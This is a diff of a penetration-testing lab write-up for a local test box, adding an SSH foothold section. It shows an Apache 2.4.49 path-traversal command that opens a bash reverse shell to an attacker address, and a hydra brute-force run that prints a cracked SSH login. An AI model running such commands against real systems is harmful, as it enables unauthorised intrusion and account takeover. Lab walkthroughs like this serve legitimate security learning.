@@ -138,33 +138,7 @@ in his `/home` there are some files, maybe useful for priviledge escalation
 ftp-user@ubuntulab:/usr/local/apache24/cgi-bin$ ls
 printenv  printenv.vbs	printenv.wsf  test-cgi
 ```
-### Execute and explore binaries
-Try to execute `printenv`
-```sh
-ftp-user@ubuntulab:~$ printenv
-SHELL=/bin/bash
-PWD=/usr/local/apache24/cgi-bin/
-LOGNAME=ftp-user
-XDG_SESSION_TYPE=tty
-MOTD_SHOWN=pam
-HOME=/usr/local/apache24/cgi-bin/
-LANG=en_US.UTF-8
-LC_TERMINAL=iTerm2
-SSH_CONNECTION=192.168.56.3 56806 192.168.56.2 22
-XDG_SESSION_CLASS=user
-TERM=xterm-256color
-USER=ftp-user
-LC_TERMINAL_VERSION=3.5.0beta22
-SHLVL=1
-XDG_SESSION_ID=37
-XDG_RUNTIME_DIR=/run/user/1001
-SSH_CLIENT=192.168.56.3 56806 22
-XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
-SSH_TTY=/dev/pts/0
-_=/usr/bin/printenv
-```
+
 # Privilege escalation
 ## Cronjob health-check.sh
 The crontab was set to execute the health-check.sh every minute (`*/1 * * * *`)
@@ -174,7 +148,32 @@ The crontab was set to execute the health-check.sh every minute (`*/1 * * * *`)
 ``` 
 
  # Foothold
+ ## via Apache
 With that version of Apache (2.4.49) misconfigured, we are able to produce a remote code execution via Path Traversal.
  ```sh
  curl -s -X POST -d "echo; bash -i >& /dev/tcp/192.168.56.3/9321 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
  ```
+ ## via SSH 
+Since SSH is enabled, we could try to enumerate SSH users and guess their passwords.
+To find username `ubuntu` we have used `-L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` and for password the command below
+ ```sh
+ ┌──(kali㉿kali)-[~/Desktop]
+└─$ hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.4 ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-09 12:49:56
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
+[DATA] attacking ssh://192.168.56.4:22/
+[22][ssh] host: 192.168.56.4   login: ubuntu   password: admin@123
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-09 12:50:20
+```
+```sh
+[22][ssh] host: 192.168.56.4   login: ubuntu   password: admin@123
+```
+
